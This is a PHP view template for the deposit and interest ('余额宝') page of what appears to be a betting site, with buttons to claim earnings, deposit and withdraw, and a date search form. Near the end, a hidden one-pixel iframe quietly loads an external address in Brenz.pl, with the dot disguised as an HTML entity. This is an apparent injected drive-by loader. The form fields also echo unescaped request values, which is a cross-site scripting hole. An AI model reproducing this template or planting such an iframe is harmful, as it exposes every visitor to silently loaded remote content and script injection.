<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<?php $this->display('inc_skin.php',0,''); ?>
<script type="text/javascript">
$(function(){
	$('#btn_search').click();
	//分页
	$('.bottompage a[href]').live('click', function(){
		$('.page_list').load($(this).attr('href'));
		return false;
	});
});

//余额宝存取利率
function pull(err,data){
	if(err){
		davidError(err);
	}else{
		davidOk(data);
		reloadMemberInfo();
	}
}
function BeforeSearchDeposit(){}
function SearchDeposit(err, data){
	if(err){
		davidError(err);
	}else{
		$('.page_list').html(data);
	}
}
</script>
</head>
<body>
<?php $this->display('inc_header.php'); ?>
<div id="rightcon">
            <div class="wrapper bigbox">
<div class="page-wrapper">
    <?php $this->display('inc_left_4.php'); ?><div class="top_menu">
        <a href="<?=$this->basePath('Event-huodong') ?>">优惠活动</a>
        <a class="act" href="<?= $this->basePath('Deposit-main') ?>">余额宝</a>
    </div>
    <div class="page-info">
        <div class="page_search">
		<table><tr>
		<td>
		 <a href="<?=$this->basePath('Deposit-pull') ?>" dataType="json" call="pull" target="ajax" class="btn btn1 btn-action">领取收益</a>
		<a href="<?=$this->basePath('Deposit-recharge') ?>" class="btn btn1 btn-action">余额宝（存款）</a>
		<a href="<?=$this->basePath('Deposit-tocash') ?>" class="btn btn1 btn-action">余额宝（取款）</a>
		</td>
	  </tr>
	  <tr>
	  <td>
	  <form action="<?=$this->basePath('Deposit-depositlist') ?>" dataType="html" target="ajax" method="get" onajax="BeforeSearchDeposit" call="SearchDeposit">
   时间：<input type="text" name="fromTime" class="datainput"  value="<?=$this->iff($_REQUEST['fromTime'],$_REQUEST['fromTime'],date('Y-m-d',$GLOBALS['fromTime']))?>"/>至<input type="text" name="toTime"  class="datainput" value="<?=$this->iff($_REQUEST['toTime'],$_REQUEST['toTime'],date('Y-m-d',$GLOBALS['toTime']))?>"/>
      <input type="submit" value="查 询" id="btn_search" class="btn_search btn-action btn chazhao">  
	  </form></td>
	  </tr>
	   <td><span class="green">*余额宝收益计算：收益时长/1440*收益利率*0.01*余额宝当时存额=余额宝当期收益</span></td>	  
	    </table> 
        </div>
        <div class="clear"></div>
        <div class="page_list">
           <!--下注列表-->
             <?php $this->display('deposit/deposit-list.php'); ?>
           <!--下注列表 end -->
        </div>
        <div class="clear"></div>
    </div>
</div>
</div>
</div><?php $this->display('inc_footer.php'); ?>
<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>
  
   
 